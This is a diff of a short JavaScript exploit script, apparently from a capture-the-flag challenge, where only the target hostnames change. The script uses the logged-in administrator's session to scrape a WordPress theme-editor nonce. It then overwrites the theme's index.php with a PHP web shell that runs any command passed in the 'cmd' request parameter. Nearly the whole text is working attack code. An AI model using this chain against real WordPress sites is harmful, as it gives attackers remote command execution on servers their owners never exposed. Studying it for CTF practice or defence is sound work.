@@ -1,5 +1,5 @@
 async function pepe(){
-    var a = await fetch('https://bd4b67cc1320abe3c5966500-1024-diff-the-patch.challenge.master.camp.allesctf.net:31337/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
+    var a = await fetch('https://44c4ab8478e89d56e6d5bb00-1024-diff-the-patch.challenge.master.camp.allesctf.net:31337/wp-admin/theme-editor.php?file=index.php&theme=twentytwentytwo',{"credentials":"include"}).then(resp=>{return resp.text()}).then(text => {return text.match(/name="nonce" value="([0-9a-f]{10})/)});
     console.log(a);
     return a;
 }
@@ -7,7 +7,7 @@ async function pepe(){
 try{
 var a = await pepe();
 
-fetch("https://bd4b67cc1320abe3c5966500-1024-diff-the-patch.challenge.master.camp.allesctf.net:31337/wp-admin/admin-ajax.php", {
+fetch("https://44c4ab8478e89d56e6d5bb00-1024-diff-the-patch.challenge.master.camp.allesctf.net:31337/wp-admin/admin-ajax.php", {
     "headers":{"Content-type":"application/x-www-form-urlencoded"},
 "body": `nonce=${a[1]}&file=index.php&theme=twentytwentytwo&newcontent=<?php  if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
 ?>&action=edit-theme-plugin-file&file=index.php&theme=twentytwentytwo`,
